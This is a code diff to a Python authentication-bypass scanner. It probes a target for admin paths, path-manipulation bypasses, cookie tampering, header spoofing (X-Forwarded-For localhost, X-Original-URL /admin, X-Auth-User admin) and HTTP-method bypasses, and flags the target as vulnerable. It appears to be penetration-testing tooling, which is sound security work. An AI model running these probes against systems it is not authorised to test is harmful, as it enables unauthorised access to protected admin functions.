@@ -1,5 +1,10 @@
 from typing import Dict, List, Optional
 import requests
+import copy
+
+from tools.log_utils import get_logger
+
+logger = get_logger("auth_bypass")
 
 ADMIN_PATHS = [
     "/admin", "/administrator", "/admin.php", "/admin/login",
@@ -33,7 +38,8 @@ HEADER_INJECTIONS = [
     {"X-Forwarded-For": "localhost"},
     {"X-Forwarded-Host": "localhost"},
     {"X-Real-IP": "127.0.0.1"},
-    {"X-Original-URL": "/" or "/admin"},
+    {"X-Original-URL": "/"},
+    {"X-Original-URL": "/admin"},
     {"X-Rewrite-URL": "/admin"},
     {"X-Forwarded-Proto": "https"},
     {"X-Forwarded-Port": "443"},
@@ -43,6 +49,8 @@ HEADER_INJECTIONS = [
     {"X-Remote-Group": "admin"},
     {"X-Auth-User": "admin"},
 ]
+
+BYPASS_METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE"]
 
 
 def check_admin_endpoints(url: str, sess: Optional[requests.Session] = None,
@@ -57,8 +65,8 @@ def check_admin_endpoints(url: str, sess: Optional[requests.Session] = None,
             if r.status_code in (200, 301, 302, 403):
                 results.append({"path": path, "status": r.status_code,
                                 "length": len(r.text)})
-        except:
-            pass
+        except Exception as e:
+            logger.debug("admin endpoint %s: %s", path, e)
     return results
 
 
@@ -72,10 +80,10 @@ def check_path_bypass(url_pattern: str, sess: Optional[requests.Session] = None,
         try:
             r = sess.get(test_url if test_url.startswith("http") else url_pattern.rstrip("/") + bp,
                          timeout=timeout, verify=False)
-            if r.status_code == 200:
+            if r.status_code in (200, 301, 302):
                 results.append({"bypass": bp, "status": r.status_code, "url": r.url})
-        except:
-            pass
+        except Exception as e:
+            logger.debug("path bypass %s: %s", bp, e)
     return results
 
 
@@ -86,21 +94,21 @@ def check_cookie_tamper(url: str, sess: Optional[requests.Session] = None,
     baseline = None
     try:
         baseline = sess.get(url, timeout=timeout, verify=False)
-    except:
+    except Exception as e:
+        logger.debug("cookie baseline: %s", e)
         return []
     results = []
     for payload in COOKIE_TAMPER_PAYLOADS:
         try:
-            c = requests.Session()
-            c.headers.update(sess.headers)
+            sess_copy = copy.deepcopy(sess)
             for k, v in payload.items():
-                c.cookies.set(k, v)
-            r = c.get(url, timeout=timeout, verify=False)
+                sess_copy.cookies.set(k, v)
+            r = sess_copy.get(url, timeout=timeout, verify=False)
             if r.status_code != baseline.status_code or len(r.text) != len(baseline.text):
                 results.append({"cookie": payload, "status": r.status_code,
                                 "length": len(r.text)})
-        except:
-            pass
+        except Exception as e:
+            logger.debug("cookie tamper %s: %s", list(payload.keys())[0], e)
     return results
 
 
@@ -111,7 +119,8 @@ def check_header_injection(url: str, sess: Optional[requests.Session] = None,
     baseline = None
     try:
         baseline = sess.get(url, timeout=timeout, verify=False)
-    except:
+    except Exception as e:
+        logger.debug("header baseline: %s", e)
         return []
     results = []
     for headers in HEADER_INJECTIONS:
@@ -120,8 +129,30 @@ def check_header_injection(url: str, sess: Optional[requests.Session] = None,
             if r.status_code != baseline.status_code or len(r.text) != len(baseline.text):
                 results.append({"headers": headers, "status": r.status_code,
                                 "length": len(r.text)})
-        except:
-            pass
+        except Exception as e:
+            logger.debug("header injection %s: %s", list(headers.keys())[0], e)
+    return results
+
+
+def check_method_bypass(url: str, sess: Optional[requests.Session] = None,
+                        timeout: float = 10.0) -> List[Dict]:
+    if sess is None:
+        sess = requests.Session()
+    results = []
+    baseline = None
+    try:
+        baseline = sess.get(url, timeout=timeout, verify=False)
+    except Exception as e:
+        logger.debug("method baseline: %s", e)
+        return results
+    for method in BYPASS_METHODS:
+        try:
+            r = sess.request(method, url, timeout=timeout, verify=False)
+            if r.status_code != baseline.status_code and r.status_code in (200, 201, 204):
+                results.append({"method": method, "status": r.status_code,
+                                "length": len(r.text)})
+        except Exception as e:
+            logger.debug("method %s: %s", method, e)
     return results
 
 
@@ -133,6 +164,7 @@ def check(url: str, sess: Optional[requests.Session] = None,
         "path_bypasses": [],
         "cookie_bypasses": [],
         "header_bypasses": [],
+        "method_bypasses": [],
     }
     if not url.startswith("http"):
         url = "http://" + url
@@ -140,7 +172,9 @@ def check(url: str, sess: Optional[requests.Session] = None,
     r["path_bypasses"] = check_path_bypass(url, sess, timeout)
     r["cookie_bypasses"] = check_cookie_tamper(url, sess, timeout)
     r["header_bypasses"] = check_header_injection(url, sess, timeout)
-    total = len(r["path_bypasses"]) + len(r["cookie_bypasses"]) + len(r["header_bypasses"])
+    r["method_bypasses"] = check_method_bypass(url, sess, timeout)
+    total = len(r["path_bypasses"]) + len(r["cookie_bypasses"]) + \
+            len(r["header_bypasses"]) + len(r["method_bypasses"])
     r["vulnerable"] = total > 0
     r["total_bypasses"] = total
     return r
